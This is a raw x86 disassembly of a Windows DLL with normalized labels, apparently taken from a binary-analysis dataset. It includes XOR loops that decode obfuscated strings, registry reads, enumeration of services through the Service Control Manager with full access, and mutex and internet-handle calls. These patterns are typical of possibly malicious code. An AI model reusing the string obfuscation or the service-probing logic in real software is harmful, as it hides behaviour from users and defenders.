mov [ edi + 0x4c ] eax
mov ecx [ esi + 0x60 ]
mov [ edi + 0x48 ] ecx
mov eax [ esi + 0x48 ]
dec eax
add esp 0xc
cmp eax 0x5
ja r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x87
call sub_1000a6f0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_100273b4 ]
lea edx [ ebp - 0x24 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov [ edi + 0x1c ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
lea edx [ ebp - 0x48 ]
mov eax 0x10d
call sub_1000a6f0
mov ebx edx
call sub_1003b530
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x11d
call sub_1000a6f0
mov ebx edx
call sub_1003b530
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xec
call sub_1000a6f0
mov ebx edx
call sub_1003b530
jmp r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xfa
call sub_1000a6f0
mov ebx edx
call sub_1003b530
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x38
call sub_1000a6f0
mov ebx edx
call sub_1003b530
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x10
call sub_1000a6f0
mov ebx edx
call sub_1003b530
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff6
and edx 0xff
mov [ ebp + eax * 2 - 0x38 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x26 ] ax
mov eax [ ebp - 0xa8 ]
mov ebx [ eax ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
push eax
call [ LocalFree@IAT ]
mov edx [ esi + 0x58 ]
push edx
lea edx [ ebp - 0x38 ]
lea esi [ ebp - 0x18 ]
call sub_1000ea00
mov eax esi
push eax
lea eax [ edi + 0x54 ]
call sub_1002e630
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] r--data
test eax eax
je r-xdata
mov ecx [ ebp - 0xa8 ]
add ebx 0x1c
cmp ebx [ ecx + 0x4 ]
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov esi [ ebp - 0xac ]
sub_100273d0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10027411
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_10012991
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1003e1ac
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_100274a0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_10027500
push 0x4
push 0x0
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
mov [ eax ] 0x0
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
sub_10027540
push ebp
mov ebp esp
push 0xffffffff
push sub_10080b00
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x144
push 0x0
mov [ ebp - 0x80 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov eax [ edi + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x78 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x78 ] 0x0
call sub_10028710
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x7c ]
test esi esi
jne r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
mov eax 0x1
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
call sub_1004c320
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xb3
call sub_1001bb80
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x78 ]
test esi esi
je r-xdata
lea ecx [ eax + eax ]
push esi
call sub_1003ca90
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ ebp - 0x80 ]
lea ecx [ esi + 0x13c ]
call sub_1000fd10
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
xor eax eax
lea edx [ ebp - 0x74 ]
mov eax 0x90
call sub_1001bb80
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_100276d6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1004ba5c
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10045daa
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_10012991
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_10027786
push 0x3c
mov eax sub_1007e369
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10042119
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10036d11
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1002785d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002903f
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100278a0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
mov ebx ecx
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov esi ecx
mov cl 0x1
push edi
mov [ ebp - 0x4 ] cl
jne r-xdata
mov edi esi
mov [ ebp + 0x10 ] edi
test cl cl
je r-xdata
mov edi [ edx + 0xc ]
mov eax [ edi + 0xc ]
push edx
cmp eax [ edx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x4 ]
lea ecx [ ebp + 0x10 ]
cmp esi [ eax ]
jne r-xdata
cmp edi [ eax + 0xc ]
setb cl
cmp [ eax + 0xc ] edi
setae cl
jmp r-xdata
call sub_10065045
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
push esi
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov ecx ebx
call sub_10031b70
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_100363a0
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push edx
push esi
push 0x1
push ecx
mov ecx ebx
call sub_10031b70
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov [ ebp - 0x4 ] cl
test cl cl
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi eax
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10027980
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov [ esi ] 0x0
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
sub_100279c0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_10008ab0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_100279e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1000702c
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_10012991
mov [ eax ] ebx
call sub_1002788e
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1007bce2
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_10069589
add esp 0x10
test eax eax
je r-xdata
sub_10027ab0
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0x110 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x82c ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x620 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ edi + 0x8 ]
lea eax [ ebp - 0x82c ]
push eax
lea ebx [ ebp - 0x418 ]
call sub_10030bd0
add esp 0x4
test eax eax
je r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x828 ]
push ecx
lea ebx [ ebp - 0x210 ]
call sub_1002d380
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
mov edi [ edi ]
mov [ ebp - 0x830 ] dl
xor ebx ebx
xor esi esi
xor edx edx
cmp edi ebx
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
mov eax [ ebp - 0x830 ]
push eax
mov eax [ ebp - 0x82c ]
lea ecx [ ebp - 0x210 ]
push ecx
push eax
lea ecx [ ebp - 0x418 ]
push ecx
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x828 ]
call sub_1000b9b0
test eax eax
jne r-xdata
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax + 0x110 ]
push ecx
mov [ eax + 0x104 ] ebx
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] 0x1
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_10027c00
push ebp
mov ebp esp
push 0xffffffff
push sub_10080c39
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x10 ] 0x1
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
mov edi [ esi + 0x10 ]
sar eax 0x1
add eax edx
cmp edi eax
ja r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_1000c1e0
mov edi [ ebp + 0x10 ]
mov eax edi
lea edx [ eax + 0x2 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10023990
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10050a00
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor edx edx
mov [ eax + edi * 2 ] dx
sub_10027cf0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff84
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe7
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffa
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x14 ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_10078600
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_10078600
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_10078600
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_10078600
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x1c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_10078600
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10027e90
push ebp
mov ebp esp
push ecx
push esi
lea ecx [ eax + eax ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ edi ]
push eax
push 0x0
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
push 0x0
push ecx
push edx
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x2
sub_10027ed5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call sub_10064dae
test al al
je r-xdata
push r--data
call sub_100616c6
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_1001df4d
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10027f30
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ecx + 0x8 ]
mov esi [ edi + 0xc ]
cmp esi [ r--data ]
je r-xdata
mov eax [ edi + 0x1c ]
xor edx edx
push ebx
cmp eax edx
je r-xdata
mov eax [ ebp + 0xc ]
push ecx
mov [ edi + 0x4 ] 0x1
call sub_10072640
mov [ edi + 0x4 ] 0x0
mov eax [ r--data ]
add esp 0x4
mov [ edi + 0xc ] eax
pop edi
mov eax 0x1
pop esi
pop ebp
retn
lea ebx [ edi + 0x94 ]
push ebx
mov [ edi + 0x1c ] edx
call sub_100081a0
mov ecx [ edi ]
push ecx
mov esi eax
push esi
push r--data
call sub_1001f980
mov eax [ ebp + 0xc ]
mov edx [ edi ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx * 4 + rw-data ]
push eax
push esi
push edi
push ecx
call edx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
je r-xdata
mov esi [ edi + 0x14 ]
add esi [ edi + 0x10 ]
cmp eax esi
jae r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
movsx esi [ eax ]
mov eax [ ebp + 0xc ]
push ecx
call sub_10072640
add esp 0x4
mov [ edi + 0x4 ] ebx
mov eax 0x1
add [ edi + 0x1c ] eax
pop ebx
pop edi
pop esi
pop ebp
retn
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
test ecx ecx
je r-xdata
push ebx
call sub_100081a0
mov esi eax
mov eax [ edi ]
push eax
push esi
push r--data
call sub_1001f980
mov edx [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
push edx
push esi
push edi
push eax
call ecx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
jne r-xdata
push ebx
call sub_1002afa0
add esp 0x4
sub_10028060
push ebp
mov ebp esp
sub esp 0x494
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov [ ebp - 0x48c ] eax
call [ GetProcessHeap@IAT ]
push 0xf003f
push 0x0
push 0x0
mov edi eax
mov [ ebp - 0x484 ] 0x0
call [ OpenSCManagerW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov esi [ EnumServicesStatusExW@IAT ]
push 0x0
push 0x0
lea ecx [ ebp - 0x478 ]
push ecx
lea edx [ ebp - 0x480 ]
push edx
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push ebx
call esi
test eax eax
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x480 ]
push eax
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov [ ebp - 0x470 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
je r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0x478 ]
push ecx
mov ecx [ ebp - 0x480 ]
lea edx [ ebp - 0x494 ]
push edx
push ecx
push eax
push 0x3
push 0x10
push 0x0
push ebx
call esi
test eax eax
jne r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
call [ CloseServiceHandle@IAT ]
pop esi
pop edi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0x3
call sub_1001b230
lea edx [ ebp - 0x14 ]
mov eax 0x9
call sub_1001b230
xor edi edi
cmp [ ebp - 0x478 ] edi
jbe r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov edx [ ebp - 0x470 ]
push edx
push 0x0
push edi
call [ HeapFree@IAT ]
pop esi
pop edi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x484 ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop esi
and eax 0xfffffffb
pop edi
xor ecx ebp
add eax 0x5
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x470 ]
lea esi [ ebp - 0x5c ]
lea eax [ ebp - 0x264 ]
sub esi eax
mov [ ebp - 0x490 ] esi
mov [ ebp - 0x474 ] ecx
lea esp [ esp ]
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ ebp - 0x474 ]
mov edx [ eax ]
mov eax 0x104
lea ecx [ ebp - 0x264 ]
lea ecx [ ecx ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
jmp r-xdata
lea ecx [ ebp - 0x47c ]
push ecx
push 0x20119
push 0x0
lea edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx 0x104
sub ecx eax
mov eax 0x104
push edx
sub eax ecx
lea ecx [ ebp + ecx * 2 - 0x264 ]
mov edx 0x7fffffff
call sub_1006b860
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
add [ ebp - 0x474 ] 0x2c
inc edi
cmp edi [ ebp - 0x478 ]
jb r-xdata
lea eax [ ebp - 0x488 ]
push eax
mov eax [ ebp - 0x47c ]
lea ecx [ ebp - 0x46c ]
push ecx
push 0x0
